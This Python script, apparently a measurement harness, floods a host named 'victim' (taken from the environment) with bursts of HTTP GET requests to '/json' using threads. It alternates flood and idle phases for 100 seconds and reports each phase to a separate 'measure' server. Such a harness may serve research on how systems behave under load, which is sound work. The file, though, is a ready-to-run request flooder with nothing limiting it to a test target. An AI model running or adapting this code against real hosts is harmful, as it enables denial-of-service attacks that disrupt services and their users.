import os
import time
import threading
import requests
import logging
from concurrent.futures import ThreadPoolExecutor

config = dict(os.environ)
measure = config.get('measure', '')  # Retrieve the 'measure' configuration variable from the environment
victim = config.get('victim', '')  # Retrieve the 'victim' configuration variable from the environment

burst = "/json"

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def send_request(host, payload):
    """
    Send a HTTP GET request to the specified host with the given payload.

    Args:
        host (str): The host to send the request to.
        payload (str): The payload to include in the request.
    """
    logger.debug("Sending request: %s", payload)
    try:
        requests.get(f"http://{host}{payload}")
    except requests.RequestException as e:
        logger.error("Request failed: %s", str(e))

def sequence_on(p):
    """
    Perform the 'on' sequence by flooding the victim with bursts.

    Args:
        p (int): The duration of each burst in seconds.
    """
    end = time.time() + p

    send_request(measure, "/On/Start")
    send_request(measure, "/On/Burst")
    logger.info("Flooding...")

    while time.time() < end:
        with ThreadPoolExecutor() as executor:
            executor.submit(send_request, victim, burst)

    send_request(measure, "/On/Idle")
    logger.info("Iteration complete")

    time.sleep(10 - p)
    send_request(measure, "/On/Iteration")

def sequence_off(p):
    """
    Perform the 'off' sequence by idle for the specified duration.

    Args:
        p (int): The duration of the idle period in seconds.
    """
    end = time.time() + p

    send_request(measure, "/Off/Start")
    send_request(measure, "/Off/Noise")

    while time.time() < end:
        time.sleep(1)  # Idle for 1 second

    send_request(measure, "/Off/Idle")
    time.sleep(10 - p)
    send_request(measure, "/Off/Iteration")

def run(p, d):
    """
    Run the test for the specified duration.

    Args:
        p (int): The duration of each burst/idle period in seconds.
        d (int): The total duration of the test in seconds.
    """
    logger.info("Starting the test")
    end = time.time() + d

    with ThreadPoolExecutor() as executor:
        executor.submit(timeout_worker, sequence_on, p, end)
        executor.submit(timeout_worker, sequence_off, p, end)

def timeout_worker(function, p, end):
    """
    Execute the specified function until the given end time.

    Args:
        function (callable): The function to execute.
        p (int): The parameter to pass to the function.
        end (float): The end time.
    """
    while time.time() < end:
        function(p)

run(5, 100)
